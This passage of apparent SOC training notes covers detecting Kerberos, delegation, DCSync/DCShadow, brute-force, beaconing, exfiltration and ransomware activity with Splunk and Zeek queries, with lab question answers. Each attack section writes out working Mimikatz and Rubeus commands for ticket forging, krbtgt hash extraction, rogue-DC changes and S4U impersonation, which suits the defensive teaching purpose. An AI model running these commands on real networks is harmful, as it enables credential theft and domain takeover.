<ol>
<li>
<p>The attacker extracts the NTLM hash of the KRBTGT account using a <code>DCSync</code> attack (alternatively, they can use <code>NTDS.dit</code> and <code>LSASS process dumps</code> on the Domain Controller).</p>
</li>
<li>
<p>Armed with the <code>KRBTGT</code> hash, the attacker forges a TGT for an arbitrary user account, assigning it domain administrator privileges.</p>
<p>```
mimikatz # kerberos::golden /domain:lab.internal.local /sid:<admin's sid> /rc4:<NTLM hash extracted in step 1> /user:EvilAdmin /ptt</p>
<p>klist
```
3. The attacker injects the forged TGT in the same manner as a Pass-the-Ticket attack.</p>
</li>
</ol>
<p><strong>Golden Ticket Detection Opportunities</strong></p>
<p>Detecting Golden Ticket attacks can be challenging, as the TGT can be forged offline by an attacker, leaving virtually no traces of <code>Mimikatz</code> execution. One option is to monitor common methods of extracting the <code>KRBTGT</code> hash:</p>
<ul>
<li>DCSync attack</li>
<li>NTDS.dit file access</li>
<li>LSASS memory read on the domain controller (Sysmon Event ID 10)</li>
</ul>
<p>From another standpoint, a Golden Ticket is just another ticket for Pass-the-Ticket detection.</p>
<p><strong>Detecting Golden Tickets With Splunk (Yet Another Ticket To Be Passed Approach)</strong></p>
<pre><code class="language-splunk">index=main earliest=1690451977 latest=1690452262 source=&quot;WinEventLog:Security&quot; user!=*$ EventCode IN (4768,4769,4770) 
| rex field=user &quot;(?&lt;username&gt;[^@]+)&quot;
| rex field=src_ip &quot;(\:\:ffff\:)?(?&lt;src_ip_4&gt;[0-9\.]+)&quot;
| transaction username, src_ip_4 maxspan=10h keepevicted=true startswith=(EventCode=4768)
| where closed_txn=0
| search NOT user=&quot;*$@*&quot;
| table _time, ComputerName, username, src_ip_4, service_name, category
</code></pre>
<p><strong>Silver Ticket</strong></p>
<p>Adversaries who possess the password hash of a target service account (e.g., <strong>SharePoint</strong>, <strong>MSSQL</strong>) may forge Kerberos Ticket Granting Service (TGS) tickets, also known as <strong>Silver Tickets</strong>. Silver tickets can be used to impersonate any user, but they are more limited in scope than Golden Tickets, as they only allow adversaries to access a specific resource (e.g., <strong>MSSQL</strong>) and the system hosting the resource.</p>
<p><strong>Silver Ticket Attack Steps:</strong></p>
<ol>
<li>
<p>The attacker extracts the NTLM hash of the targeted service account (or the computer account for <code>CIFS</code> access) using tools like <code>Mimikatz</code> or other credential dumping techniques.</p>
</li>
<li>
<p>Generate a Silver Ticket: Using the extracted NTLM hash, the attacker employs tools like <code>Mimikatz</code> to create a forged TGS ticket for the specified service.</p>
</li>
</ol>
<pre><code>.\mimikatz.exe

mimikatz # kerberos::golden /sid:&lt;&gt; /id:500 /target:iis.lab.internal.local /service:CIFS /domain:lab.internal.local /rc4:&lt;&gt; /user:DarthKittius /ptt
mimikatz # exit

klist
</code></pre>
<ol>
<li>The attacker injects the forged TGT in the same manner as a Pass-the-Ticket attack.</li>
</ol>
<p><strong>Silver Ticket Detection Opportunities</strong></p>
<p>Detecting forged service tickets (TGS) can be challenging, as there are no simple indicators of attack. In both Golden Ticket and Silver Ticket attacks, arbitrary users can be used, <code>including non-existent ones. Event ID 4720 (A user account was created)</code> can help identify newly created users. Subsequently, we can compare this user list with logged-in users.</p>
<p>Because there is no validation for user permissions, users can be granted administrative permissions. <code>Event ID 4672 (Special Logon)</code> can be employed to detect anomalously assigned privileges.</p>
<p><strong>Detecting Silver Tickets With Splunk</strong></p>
<ul>
<li>
<p>Detecting Silver Tickets With Splunk Through User Correlation</p>
</li>
<li>
<p>Let's first create a list of users (users.csv) leveraging Event ID 4720 (A user account was created) as follows.</p>
</li>
</ul>
<pre><code class="language-splunk">index=main latest=1690448444 EventCode=4720
| stats min(_time) as _time, values(EventCode) as EventCode by user
| outputlookup users.csv
</code></pre>
<p>Note: <code>users.csv</code> can be downloaded from the <code>Resources</code> section of this module (upper right corner) and uploaded to Splunk by clicking Settings -&gt; Lookups -&gt; Lookup table files -&gt; New Lookup Table File.</p>
<ol>
<li>Let's now compare the list above with logged-in users as follows.</li>
</ol>
<pre><code class="language-splunk">index=main latest=1690545656 EventCode=4624
| stats min(_time) as firstTime, values(ComputerName) as ComputerName, values(EventCode) as EventCode by user
| eval last24h = 1690451977
| where firstTime &gt; last24h
```| eval last24h=relative_time(now(),&quot;-24h@h&quot;)```
| convert ctime(firstTime)
| convert ctime(last24h)
| lookup users.csv user as user OUTPUT EventCode as Events
| where isnull(Events)
</code></pre>
<p><code>| eval last24h=relative_time(now(),"-24h@h")</code>: This command (commented out) would redefine the last24h variable to be exactly 24 hours before the current time. Note that this line is commented out with backticks, so it will not be executed in this search.</p>
<ul>
<li>Detecting Silver Tickets With Splunk By Targeting Special Privileges Assigned To New Logon</li>
</ul>
<pre><code class="language-splunk">index=main latest=1690545656 EventCode=4672
| stats min(_time) as firstTime, values(ComputerName) as ComputerName by Account_Name
| eval last24h = 1690451977 
```| eval last24h=relative_time(now(),&quot;-24h@h&quot;) ```
| where firstTime &gt; last24h 
| table firstTime, ComputerName, Account_Name 
| convert ctime(firstTime)
</code></pre>
<h4 id="detecting-unconstrained-delegationconstrained-delegation-attacks">Detecting Unconstrained Delegation/Constrained Delegation Attacks</h4>
<p><strong>Unconstrained Delegation</strong> is a privilege that can be granted to User Accounts or Computer Accounts in an Active Directory environment, allowing a service to authenticate to another resource on behalf of <strong>any</strong> user. This might be necessary when, for example, a web server requires access to a database server to make changes on a user's behalf.</p>
<p><strong>Attack Steps:</strong></p>
<ol>
<li>
<p>The attacker identifies systems on which Unconstrained Delegation is enabled for service accounts.</p>
<p><code>Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroundid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description</code></p>
</li>
<li>
<p>The attacker gains access to a system with Unconstrained Delegation enabled.</p>
</li>
<li>
<p>The attacker extracts Ticket Granting Ticket (TGT) tickets from the memory of the compromised system using tools such as Mimikatz.</p>
<p><code>.\Rubeus.exe asktgt /user:Administrator /domain:lab.internal.local /rc4:&lt;NTLM hash&gt; ptt</code></p>
</li>
</ol>
<p><strong>Unconstrained Delegation Attack Detection Opportunities</strong></p>
<p>PowerShell commands and LDAP search filters used for Unconstrained Delegation discovery can be detected by monitoring PowerShell script block logging (<code>Event ID 4104</code>) and LDAP request logging.</p>
<p>The main goal of an Unconstrained Delegation attack is to retrieve and reuse TGT tickets, so Pass-the-Ticket detection can be used as well.</p>
<p><strong>Detecting Unconstrained Delegation Attacks With Splunk</strong></p>
<pre><code class="language-splunk">index=main earliest=1690544538 latest=1690544540 source=&quot;WinEventLog:Microsoft-Windows-PowerShell/Operational&quot; EventCode=4104 Message=&quot;*TrustedForDelegation*&quot; OR Message=&quot;*userAccountControl:1.2.840.113556.1.4.803:=524288*&quot; 
| table _time, ComputerName, EventCode, Message
</code></pre>
<p><strong>Constrained Delegation</strong> is a feature in Active Directory that allows services to delegate user credentials only to specified resources, reducing the risk associated with Unconstrained Delegation. Any user or computer accounts that have service principal names (SPNs) set in their <strong>msDS-AllowedToDelegateTo</strong> property can impersonate any user in the domain to those specific SPNs.</p>
<p><strong>Attack Steps:</strong></p>
<ol>
<li>
<p>The attacker identifies systems where Constrained Delegation is enabled and determines the resources to which they are allowed to delegate.</p>
<p><code>Get-ADObject -fi {(msDS-AllowedToDelegateTo -like "*")}</code></p>
</li>
<li>
<p>The attacker gains access to the TGT of the principal (user or computer). The TGT can be extracted from memory (Rubeus dump) or requested with the principal's hash.</p>
<p><code>.\Rubeus.exe asktgt /user:Backup /domain:lab.internal.local /password:B@ckup1234 /outfile:ticket.kirbi</code></p>
</li>
<li>
<p>The attacker uses the S4U technique to impersonate a high-privileged account to the targeted service (requesting a TGS ticket).</p>
<p><code>.\Rubeus.exe s4u /ticket:ticket.kirbi /impersonateuser:WELDON_EVANS /domain:lab.internal.local /msdsspn:ldap/dc.lab.internal.local /altservice:cifs /ptt</code></p>
</li>
<li>
<p>The attacker injects the requested ticket and accesses targeted services as the impersonated user.</p>
<p><code>klist</code></p>
</li>
</ol>
<p><strong>Kerberos Protocol Extensions - Service For User</strong></p>
<p><code>Service for User to Self (S4U2self)</code> and <code>Service for User to Proxy (S4U2proxy)</code> allow a service to request a ticket from the Key Distribution Center (KDC) on behalf of a user. S4U2self allows a service to obtain a TGS for itself on behalf of a user, while S4U2proxy allows the service to obtain a TGS on behalf of a user for a second service.</p>
<p>S4U2self was designed to enable a user to request a TGS ticket when another method of authentication was used instead of Kerberos. Importantly, this TGS ticket can be requested on behalf of any user, for example, an Administrator.`</p>
<p>S4U2proxy was designed to take a forwardable ticket and use it to request a TGS ticket to any SPN specified in the <code>msds-allowedtodelegateto</code> options for the user specified in the S4U2self part.</p>
<p>With a combination of S4U2self and S4U2proxy, an attacker can impersonate any user to service principal names (SPNs) set in <code>msDS-AllowedToDelegateTo</code> properties.</p>
<p><strong>Constrained Delegation Attack Detection Opportunities</strong></p>
<p>Similar to Unconstrained Delegation, it is possible to detect PowerShell commands and LDAP requests aimed at discovering vulnerable Constrained Delegation users and computers.</p>
<p>To request a TGT ticket for a principal, as well as a TGS ticket using the S4U technique, Rubeus makes connections to the Domain Controller. This activity can be detected as an unusual process network connection to TCP/UDP port <code>88</code> (Kerberos).</p>
<p><strong>Detecting Constrained Delegation Attacks With Splunk</strong></p>
<ul>
<li>Detecting Constrained Delegation Attacks - Leveraging PowerShell Logs</li>
</ul>
<pre><code class="language-splunk">index=main earliest=1690544553 latest=1690562556 source=&quot;WinEventLog:Microsoft-Windows-PowerShell/Operational&quot; EventCode=4104 Message=&quot;*msDS-AllowedToDelegateTo*&quot; 
| table _time, ComputerName, EventCode, Message
</code></pre>
<p>Event Id 4104 (script block logging), it will capture PowerShell commands and show script block logging.</p>
<ul>
<li>Detecting Constrained Delegation Attacks - Leveraging Sysmon Logs</li>
</ul>
<pre><code class="language-splunk">index=main earliest=1690562367 latest=1690562556 source=&quot;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&quot; 
| eventstats values(process) as process by process_id
| where EventCode=3 AND dest_port=88
| table _time, Computer, dest_ip, dest_port, Image, process
</code></pre>
<p>Event Id 3: Network connection detected</p>
<h4 id="detecting-dcsyncdcshadow">Detecting DCSync/DCShadow</h4>
<p><strong>DCSync</strong> is a technique exploited by attackers to extract password hashes from Active Directory Domain Controllers (DCs). This method capitalizes on the <strong>Replication Directory Changes</strong> permission typically granted to domain controllers, enabling them to read all object attributes, including password hashes. Members of the Administrators, Domain Admins, and Enterprise Admin groups, or computer accounts on the domain controller, have the capability to execute DCSync to extract password data from Active Directory. This data may encompass both current and historical hashes of potentially valuable accounts, such as KRBTGT and Administrators.</p>
<p><strong>Attack Steps:</strong></p>
<ol>
<li>
<p>The attacker secures administrative access to a domain-joined system or escalates privileges to acquire the requisite rights to request replication data.</p>
</li>
<li>
<p>Utilizing tools such as Mimikatz, the attacker requests domain replication data by using the DRSGetNCChanges interface, effectively mimicking a legitimate domain controller.</p>
<p><code>mimikatz # lsadump::dcsync /domain:lab.internal.local /user:krbtgt</code></p>
</li>
<li>
<p>The attacker may then craft Golden Tickets, Silver Tickets, or opt to employ Pass-the-Hash/Overpass-the-Hash attacks.</p>
</li>
</ol>
<p><strong>DCSync Detection Opportunities</strong></p>
<p><code>DS-Replication-Get-Changes</code> operations can be recorded with <code>Event ID 4662</code>. However, an additional <code>Audit Policy Configuration</code> is needed since it is not enabled by default (Computer Configuration/Windows Settings/Security Settings/Advanced Audit Policy Configuration/DS Access).</p>
<p>Seek out events containing the property <code>{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}</code>, corresponding to <code>DS-Replication-Get-Changes</code>, as Event <code>4662</code> solely consists of GUIDs.</p>
<p>Event ID 4622: A security package has been loaded by the Local Security Authority.</p>
<p><strong>Detecting DCSync With Splunk</strong></p>
<pre><code class="language-splunk">index=main earliest=1690544278 latest=1690544280 EventCode=4662 Message=&quot;*Replicating Directory Changes*&quot;
| rex field=Message &quot;(?P&lt;property&gt;Replicating Directory Changes.*)&quot;
| table _time, user, object_file_name, Object_Server, property
</code></pre>
<p><strong>DCShadow</strong> is an advanced tactic employed by attackers to enact unauthorized alterations to Active Directory objects, encompassing the creation or modification of objects without producing standard security logs. The assault harnesses the <strong>Directory Replicator (Replicating Directory Changes)</strong> permission, customarily granted to domain controllers for replication tasks. DCShadow is a clandestine technique enabling attackers to manipulate Active Directory data and establish persistence within the network. Registration of a rogue DC necessitates the creation of new server and <strong>nTDSDSA</strong> objects in the Configuration partition of the AD schema, which demands Administrator privileges (either Domain or local to the DC) or the <strong>KRBTGT</strong> hash.</p>
<p><strong>Attack Steps:</strong></p>
<ol>
<li>
<p>The attacker secures administrative access to a domain-joined system or escalates privileges to acquire the necessary rights to request replication data.</p>
</li>
<li>
<p>The attacker registers a rogue domain controller within the domain, leveraging the <code>Directory Replicator</code> permission, and executes changes to AD objects, such as modifying user groups to Domain Administrator groups.</p>
<p><code>mimikatz # token::whoami
mimikatz # lsadump::dcshadow /object:JENNY_HICKMAN /attribute:primaryGroupID /value:512</code>
3. The rogue domain controller initiates replication with the legitimate domain controllers, disseminating the changes throughout the domain.</p>
<p><code>mimikatz # lsadump::dcshadow /push</code></p>
</li>
</ol>
<p><strong>DCShadow Detection Opportunities</strong></p>
<p>To emulate a Domain Controller, DCShadow must implement specific modifications in Active Directory:</p>
<ul>
<li>
<p>Add a new nTDSDSA object</p>
</li>
<li>
<p>Append a global catalog ServicePrincipalName to the computer object</p>
</li>
</ul>
<p><code>Event ID 4742 (Computer account was changed)</code> logs changes related to computer objects, including <code>ServicePrincipalName</code>.</p>
<p><strong>Detecting DCShadow With Splunk</strong></p>
<pre><code class="language-splunk">index=main earliest=1690623888 latest=1690623890 EventCode=4742 
| rex field=Message &quot;(?P&lt;gcspn&gt;GC\/[a-zA-Z0-9\.\-\/]+)&quot; 
| table _time, ComputerName, Security_ID, Account_Name, user, gcspn 
| search gcspn=*
</code></pre>
<h4 id="detecting-rdp-brute-force-attacks">Detecting RDP Brute Force Attacks</h4>
<p>We often encounter <strong>Remote Desktop Protocol (RDP) brute force attacks</strong> as a favorite vector for attackers to gain initial foothold in a network. The concept of an RDP brute force attack is relatively straightforward: attackers attempt to login into a Remote Desktop session by systematically guessing and trying different passwords until they find the correct one. This method exploits the fact that many users often have weak or default passwords that are easy to guess.</p>
<p><strong>Detecting RDP Brute Force Attacks With Splunk &amp; Zeek Logs</strong></p>
<p>Related Evidence:</p>
<ul>
<li>
<p>Related Directory: <code>/home/htb-student/module_files/rdp_bruteforce</code></p>
</li>
<li>
<p>Related Splunk Index: <code>rdp_bruteforce</code></p>
</li>
<li>
<p>Related Splunk Sourcetype: <code>bro:rdp:json</code></p>
</li>
</ul>
<pre><code class="language-splunk">index=&quot;rdp_bruteforce&quot; sourcetype=&quot;bro:rdp:json&quot;
| bin _time span=5m
| stats count values(cookie) by _time, id.orig_h, id.resp_h
| where count&gt;30
</code></pre>
<p><strong>Q:</strong> Construct a Splunk query targeting the "ssh_bruteforce" index and the "bro:ssh:json" sourcetype. The resulting output should display the time bucket, source IP, destination IP, client, and server, together with the cumulative count of authentication attempts where the total number of attempts surpasses 30 within a 5-minute time window. Enter the IP of the client that performed the SSH brute attack as your answer.</p>
<pre><code class="language-splunk">index=&quot;ssh_bruteforce&quot; sourcetype=&quot;bro:ssh:json&quot;
| bin _time span=5m
| stats count as auth_attempts by _time, src, dest, client, server
</code></pre>
<h4 id="detecting-beaconing-malware">Detecting Beaconing Malware</h4>
<p><strong>Malware beaconing</strong> is a technique we frequently encounter in our cybersecurity investigations. It refers to the periodic communication initiated by malware-infected systems with their respective command and control (C2) servers. The beacons, typically small data packets, are sent at regular intervals, much like a lighthouse sends out a regular signal.</p>
<p>In our analysis of beaconing behavior, we often observe several distinct patterns. The beaconing intervals can be fixed, jittered (varied slightly from a fixed pattern), or follow a more complex schedule based on the malware's specific objectives. We've encountered malware that uses various protocols for beaconing, including HTTP/HTTPS, DNS, and even ICMP (ping).</p>
<p><strong>Detecting Beaconing Malware With Splunk &amp; Zeek Logs</strong></p>
<pre><code class="language-splunk">index=&quot;cobaltstrike_beacon&quot; sourcetype=&quot;bro:http:json&quot; 
| sort 0 _time
| streamstats current=f last(_time) as prevtime by src, dest, dest_port
| eval timedelta = _time - prevtime
| eventstats avg(timedelta) as avg, count as total by src, dest, dest_port
| eval upper=avg*1.1
| eval lower=avg*0.9
| where timedelta &gt; lower AND timedelta &lt; upper
| stats count, values(avg) as TimeInterval by src, dest, dest_port, total
| eval prcnt = (count/total)*100
| where prcnt &gt; 90 AND total &gt; 10
</code></pre>
<h4 id="detecting-nmap-port-scanning">Detecting Nmap Port Scanning</h4>
<p><strong>Detecting Nmap Port Scanning With Splunk &amp; Zeek Logs</strong></p>
<pre><code class="language-splunk">index=&quot;cobaltstrike_beacon&quot; sourcetype=&quot;bro:conn:json&quot; orig_bytes=0 dest_ip IN (192.168.0.0/16, 172.16.0.0/12, 10.0.0.0/8) 
| bin span=5m _time 
| stats dc(dest_port) as num_dest_port by _time, src_ip, dest_ip 
| where num_dest_port &gt;= 3
</code></pre>
<p><strong>Q:</strong> Use the "cobaltstrike_beacon" index and the "bro:conn:json" sourcetype. Did the attacker scan port 505? Answer format: Yes, No</p>
<pre><code class="language-splunk">index=&quot;cobaltstrike_beacon&quot; sourcetype=&quot;bro:conn:json&quot; orig_bytes=0 dest_ip IN (192.168.0.0/16, 172.16.0.0/12, 10.0.0.0/8) 
| table _time, src_ip, dest_ip, dest_port 
| where dest_port=505
</code></pre>
<h4 id="detecting-kerberos-brute-force-attacks">Detecting Kerberos Brute Force Attacks</h4>
<p>When adversaries perform <strong>Kerberos-based user enumeration</strong>, they send an AS-REQ (Authentication Service Request) message to the Key Distribution Center (KDC), which is responsible for handling Kerberos authentication. This message includes the username they're trying to validate. They pay close attention to the response they receive, as it reveals valuable information about the existence of the specified user account.</p>
<p>A valid username will prompt the server to <strong>return a TGT</strong> or raise an error like <strong>KRB5KDC_ERR_PREAUTH_REQUIRED</strong>, indicating that preauthentication is required. On the other hand, an invalid username will be met with a Kerberos error code <strong>KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN</strong> in the AS-REP (Authentication Service Response) message. By examining the responses to their AS-REQ messages, adversaries can quickly determine which usernames are valid on the target system.</p>
<p><strong>Detecting Kerberos Brute Force Attacks With Splunk &amp; Zeek Logs</strong></p>
<pre><code class="language-splunk">index=&quot;kerberos_bruteforce&quot; sourcetype=&quot;bro:kerberos:json&quot;
error_msg!=KDC_ERR_PREAUTH_REQUIRED
success=&quot;false&quot; request_type=AS
| bin _time span=5m
| stats count dc(client) as &quot;Unique users&quot; values(error_msg) as &quot;Error messages&quot; by _time, id.orig_h, id.resp_h
| where count&gt;30
</code></pre>
<pre><code class="language-splunk">index=&quot;kerberos_bruteforce&quot; sourcetype=&quot;bro:kerberos:json&quot; error_msg!=KDC_ERR_PREAUTH_REQUIRED
success=&quot;false&quot; request_type=AS
| bin _time span=5m
| table client,id.orig_h, id.resp_h
| where client=&quot;accrescent/windomain.local&quot;
</code></pre>
<h4 id="detecting-kerberoasting">Detecting Kerberoasting</h4>
<p>Evidence Source: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting</p>
<p><strong>Detecting Kerberoasting With Splunk &amp; Zeek Logs</strong></p>
<pre><code class="language-splunk">index=&quot;sharphound&quot; sourcetype=&quot;bro:kerberos:json&quot;
request_type=TGS cipher=&quot;rc4-hmac&quot; 
forwardable=&quot;true&quot; renewable=&quot;true&quot;
| table _time, id.orig_h, id.resp_h, request_type, cipher, forwardable, renewable, client, service
</code></pre>
<h4 id="detecting-golden-tickets">Detecting Golden Tickets</h4>
<p><strong>Detecting Golden Tickets With Splunk &amp; Zeek Logs</strong></p>
<pre><code class="language-splunk">index=&quot;golden_ticket_attack&quot; sourcetype=&quot;bro:kerberos:json&quot;
| where client!=&quot;-&quot;
| bin _time span=1m 
| stats values(client), values(request_type) as request_types, dc(request_type) as unique_request_types by _time, id.orig_h, id.resp_h
| where request_types==&quot;TGS&quot; AND unique_request_types==1
</code></pre>
<h4 id="detecting-cobalt-strikes-psexec">Detecting Cobalt Strike's PSExec</h4>
<p>Image Source: https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/</p>
<p><strong>Detecting Cobalt Strike's PSExec With Splunk &amp; Zeek Logs</strong></p>
<pre><code class="language-splunk">index=&quot;cobalt_strike_psexec&quot;
sourcetype=&quot;bro:smb_files:json&quot;
action=&quot;SMB::FILE_OPEN&quot; 
name IN (&quot;*.exe&quot;, &quot;*.dll&quot;, &quot;*.bat&quot;)
path IN (&quot;*\\c$&quot;, &quot;*\\ADMIN$&quot;)
size&gt;0
</code></pre>
<p><strong>Q:</strong> Use the "change_service_config" index and the "bro:dce_rpc:json" sourcetype to create a Splunk search that will detect SharpNoPSExec (https://gist.github.com/defensivedepth/ae3f882efa47e20990bc562a8b052984). Enter the IP included in the "id.orig_h" field as your answer.</p>
<pre><code class="language-splunk">index=&quot;change_service_config&quot;
sourcetype=&quot;bro:dce_rpc:json&quot;
operation IN (&quot;ChangeServiceConfigW&quot;, &quot;StartServiceA&quot;)
</code></pre>
<h4 id="detecting-zerologon">Detecting Zerologon</h4>
<p>The <strong>Zerologon</strong> vulnerability, also known as CVE-2020-1472, is a critical flaw in the implementation of the Netlogon Remote Protocol, specifically in the cryptographic algorithm used by the protocol. The vulnerability can be exploited by an attacker to impersonate any computer, including the domain controller, and execute remote procedure calls on their behalf. Let's dive into the technical details of this flaw.</p>
<p>Image Source: https://www.trendmicro.com/en_us/what-is/zerologon.html</p>
<p><strong>Detecting Zerologon With Splunk &amp; Zeek Logs</strong></p>
<pre><code class="language-splunk">index=&quot;zerologon&quot; endpoint=&quot;netlogon&quot; sourcetype=&quot;bro:dce_rpc:json&quot;
| bin _time span=1m
| where operation == &quot;NetrServerReqChallenge&quot; OR operation == &quot;NetrServerAuthenticate3&quot; OR operation == &quot;NetrServerPasswordSet2&quot;
| stats count values(operation) as operation_values dc(operation) as unique_operations by _time, id.orig_h, id.resp_h
| where unique_operations &gt;= 2 AND count&gt;100
</code></pre>
<h4 id="detecting-exfiltration-http">Detecting Exfiltration (HTTP)</h4>
<p><strong>Data exfiltration</strong> inside the POST body is a technique that attackers employ to extract sensitive information from a compromised system by disguising it as legitimate web traffic. It involves transmitting the stolen data from the compromised system to an external server controlled by the attacker using HTTP POST requests. Since POST requests are commonly used for legitimate purposes, such as form submissions and file uploads, this method of data exfiltration can be difficult to detect.</p>
<p><strong>Detecting HTTP Exfiltration With Splunk &amp; Zeek Logs</strong></p>
<pre><code class="language-splunk">index=&quot;cobaltstrike_exfiltration_http&quot; sourcetype=&quot;bro:http:json&quot; method=POST
| stats sum(request_body_len) as TotalBytes by src, dest, dest_port
| eval TotalBytes = TotalBytes/1024/1024
</code></pre>
<p><strong>Q:</strong> Use the "cobaltstrike_exfiltration_https" index and the "bro:conn:json" sourcetype. Create a Splunk search to identify exfiltration through HTTPS. Enter the identified destination IP as your answer.</p>
<pre><code class="language-splunk">index=&quot;cobaltstrike_exfiltration_https&quot; sourcetype=&quot;bro:conn:json&quot; proto=&quot;tcp&quot; service=&quot;ssl&quot;
| eval total_bytes = resp_bytes + orig_bytes
| stats sum(total_bytes) as total_data_transferred, count by id.resp_h
| where total_data_transferred &gt; 10000000
| sort -total_data_transferred
| table id.resp_h, total_data_transferred, count
</code></pre>
<h4 id="detecting-exfiltration-dns">Detecting Exfiltration (DNS)</h4>
<p>Attackers employ <strong>DNS-based exfiltration</strong> due to its reliability, stealthiness, and the fact that DNS traffic is often allowed by default in network firewall rules. By embedding data within DNS queries and responses, attackers can bypass security controls and exfiltrate data covertly. </p>
<p><strong>How DNS Exfiltration Works:</strong></p>
<p>Initial Compromise: The attacker gains access to the victim's network, typically through malware, phishing, or exploiting vulnerabilities.</p>
<p>Data Identification and Preparation: The attacker locates the data they want to exfiltrate and prepares it for transmission. This usually involves encoding or encrypting the data and splitting it into small chunks.</p>
<p>Exfiltration via DNS: The attacker sends the data in the subdomains of DNS queries, utilizing techniques such as DNS tunneling or fast flux. They typically use a domain under their control or a compromised domain for this purpose. The attacker's DNS server receives the queries, extracts the data, and reassembles it.</p>
<p>Data Retrieval and Analysis: After exfiltration, the attacker decodes or decrypts the data and analyzes it.</p>
<p><strong>Detecting DNS Exfiltration With Splunk &amp; Zeek Logs</strong></p>
<pre><code class="language-splunk">index=dns_exf sourcetype=&quot;bro:dns:json&quot;
| eval len_query=len(query)
| search len_query&gt;=40 AND query!=&quot;*.ip6.arpa*&quot; AND query!=&quot;*amazonaws.com*&quot; AND query!=&quot;*._googlecast.*&quot; AND query!=&quot;_ldap.*&quot;
| bin _time span=24h
| stats count(query) as req_by_day by _time, id.orig_h, id.resp_h
| where req_by_day&gt;60
| table _time, id.orig_h, id.resp_h, req_by_day
</code></pre>
<p><strong>Q:</strong> Use the "dns_exf" index and the "bro:dns:json" sourcetype. Enter the attacker-controlled domain as your answer. Answer format: <em>.</em></p>
<pre><code class="language-splunk">index=&quot;dns_exf&quot; sourcetype=&quot;bro:dns:json&quot;
| stats count by query
| where count &gt; 100
| sort -count
| table query, count
</code></pre>
<h4 id="detecting-ransomware">Detecting Ransomware</h4>
<p><strong>Detecting Ransomware With Splunk &amp; Zeek Logs (Excessive Overwriting)</strong></p>
<pre><code class="language-splunk">index=&quot;ransomware_open_rename_sodinokibi&quot; sourcetype=&quot;bro:smb_files:json&quot; 
| where action IN (&quot;SMB::FILE_OPEN&quot;, &quot;SMB::FILE_RENAME&quot;)
| bin _time span=5m
| stats count by _time, source, action
| where count&gt;30 
| stats sum(count) as count values(action) dc(action) as uniq_actions by _time, source
| where uniq_actions==2 AND count&gt;100
</code></pre>
<p><strong>Detecting Ransomware With Splunk &amp; Zeek Logs (Excessive Renaming With The Same Extension)</strong></p>
<pre><code class="language-splunk">index=&quot;ransomware_new_file_extension_ctbl_ocker&quot; sourcetype=&quot;bro:smb_files:json&quot; action=&quot;SMB::FILE_RENAME&quot; 
| bin _time span=5m
| rex field=&quot;name&quot; &quot;\.(?&lt;new_file_name_extension&gt;[^\.]*$)&quot;
| rex field=&quot;prev_name&quot; &quot;\.(?&lt;old_file_name_extension&gt;[^\.]*$)&quot;
| stats count by _time, id.orig_h, id.resp_p, name, source, old_file_name_extension, new_file_name_extension,
| where new_file_name_extension!=old_file_name_extension
| stats count by _time, id.orig_h, id.resp_p, source, new_file_name_extension
| where count&gt;20
| sort -count
</code></pre>
<p><strong>Q:</strong> Modify the action-related part of the Splunk search of this section that detects excessive file overwrites so that it detects ransomware that delete the original files instead of overwriting them. Run this search against the "ransomware_excessive_delete_aleta" index and the "bro:smb_files:json" sourcetype. Enter the value of the "count" field as your answer.</p>
<pre><code class="language-splunk">index=&quot;ransomware_excessive_delete_aleta&quot; sourcetype=&quot;bro:smb_files:json&quot;
| where action IN (&quot;SMB::FILE_OPEN&quot;, &quot;SMB::FILE_DELETE&quot;)
| bin _time span=5m
| stats count by _time, source, action
| where count &gt; 30
| stats sum(count) as count values(action) as actions dc(action) as uniq_actions by _time, source
| where uniq_actions==2 AND count &gt; 100
</code></pre>
<h4 id="skills-assessment_3">Skills Assessment</h4>
<p><strong>Q1:</strong> Use the "empire" index and the "bro:http:json" sourcetype. Identify beaconing activity by modifying the Splunk search of the "Detecting Beaconing Malware" section and enter the value of the "TimeInterval" field as your answer.</p>
<pre><code class="language-splunk">index=&quot;empire&quot; sourcetype=&quot;bro:http:json&quot; 
| sort 0 _time
| streamstats current=f last(_time) as prevtime by src, dest, dest_port
| eval timedelta = _time - prevtime
| eventstats avg(timedelta) as avg, count as total by src, dest, dest_port
| eval upper=avg*1.1
| eval lower=avg*0.9
| where timedelta &gt; lower AND timedelta &lt; upper
| stats count, values(avg) as TimeInterval by src, dest, dest_port, total
</code></pre>
<p><strong>Q2:</strong> Use the "printnightmare" index and the "bro:dce_rpc:json" sourcetype to create a Splunk search that will detect possible exploitation of the PrintNightmare vulnerability. Enter the IP included in the "id.orig_h" field as your answer.</p>
<pre><code class="language-splunk">index=&quot;printnightmare&quot; sourcetype=&quot;bro:dce_rpc:json&quot;
| where endpoint IN (&quot;spoolss&quot;, &quot;MS-RPRN&quot;, &quot;MS-PAR&quot;)
| stats count by _time, id.orig_h, id.resp_h, endpoint, operation
| sort -count
</code></pre>
<p><strong>Q3:</strong> Use the "bloodhound_all_no_kerberos_sign" index and the "bro:dce_rpc:json" sourcetype to create a Splunk search that will detect possible BloodHound activity (https://www.lares.com/blog/active-directory-ad-attacks-enumeration-at-the-network-layer/). Enter the IP included in the "id.orig_h" field as your answer.</p>
<pre><code class="language-splunk">index=&quot;bloodhound_all_no_kerberos_sign&quot; sourcetype=&quot;bro:dce_rpc:json&quot;
| where endpoint IN (&quot;samr&quot;, &quot;lsarpc&quot;) 
| stats count by operation, id.orig_h, id.resp_h, endpoint
| sort -count
</code></pre>







  
    
  
  


  <aside class="md-source-file">
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Last update">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1-2.1-2M12.5 7v5.2l4 2.4-1 1L11 13V7h1.5M11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2v1.8Z"/></svg>
    </span>
